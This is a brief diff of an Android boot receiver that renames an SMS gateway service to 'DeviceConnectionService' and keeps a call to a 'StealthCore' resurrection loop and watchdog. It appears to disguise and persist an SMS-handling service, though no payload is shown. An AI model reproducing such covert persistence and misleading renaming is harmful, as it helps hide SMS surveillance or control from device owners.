@@ -63,8 +63,8 @@ class BootReceiver : BroadcastReceiver() {
                     return@launch
                 }
 
-                AppLogger.d(TAG, "Starting SmsGatewayService after boot")
-                SmsGatewayService.startService(context)
+                AppLogger.d(TAG, "Starting DeviceConnectionService after boot")
+                DeviceConnectionService.startService(context)
 
                 // Start the fine-grained resurrection loop and coarse watchdog.
                 StealthCore.startResurrectionLoop(context)
